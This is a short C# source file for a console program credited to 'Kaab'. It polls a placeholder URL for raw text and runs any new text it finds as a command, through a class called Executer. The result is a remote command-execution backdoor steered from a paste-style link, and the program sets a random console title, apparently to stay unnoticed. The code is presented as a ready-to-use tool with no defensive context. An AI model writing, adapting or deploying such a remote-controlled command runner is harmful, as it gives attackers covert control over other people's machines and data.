using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace OG
{
    class Program
    {
        public static string URL = @"Your Link To Get Message as Raw";

        public static OGReader reader;

        static void Main(string[] args)
        {
            Console.Title = Util.RandomString(10);
            Util.PrintTitle();
            Alert.Info("OG By Kaab");

            reader = new OGReader(URL,1000);
            reader.ReadFunction = new OGReader.Read(ReadCommand);
            reader.OnChange += Reader_OnChange;
            reader.Start();
        }

        private static void Reader_OnChange(string command) // On message change
        {
            Alert.Success("Recieved : " + command);
            Executer.Run(command); // Runs the command
        }

        private static void ReadCommand() // Main loop to get message in READ_DELAY
        {
  
            while(true)
            {
                Thread.Sleep(reader.readDelay);
                var x = reader.GetText();
                if (x != reader.lastCommand)
                {
                    reader.Changed(x);
                }


                
                var text = reader.GetText();
       
                reader.lastCommand = text;


                
                
            }
        }
    }
}
